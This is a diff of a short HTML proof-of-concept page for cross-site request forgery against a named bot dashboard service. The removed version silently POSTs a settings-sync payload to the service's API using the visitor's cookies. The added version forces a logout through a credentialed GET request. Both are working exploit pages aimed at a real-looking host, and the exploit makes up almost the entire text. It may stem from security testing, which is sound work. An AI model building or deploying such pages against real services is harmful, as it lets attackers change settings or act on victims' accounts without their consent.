@@ -2,34 +2,13 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CSRF Test for Settings Sync</title>
+    <title>CSRF Logout Test</title>
   </head>
   <body>
     <script>
-      const payload = {
-        data: {
-          IDS: ["1310013982093869067"]
-        }
-      };
-
-      fetch("https://dashboard.wickbot.com/api/settings/sync/1358289702414979255", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(payload),
-        credentials: "include" // Ensure cookies are sent with the request
-      })
-      .then(response => {
-        if (response.ok) {
-          console.log("Request sent successfully");
-        } else {
-          console.log("Request failed with status: ", response.status);
-        }
-      })
-      .catch(error => {
-        console.error("Error sending request: ", error);
+      fetch("https://dashboard.wickbot.com/api/auth/logout", {
+        method: "GET",
+        credentials: "include"
       });
     </script>
   </body>
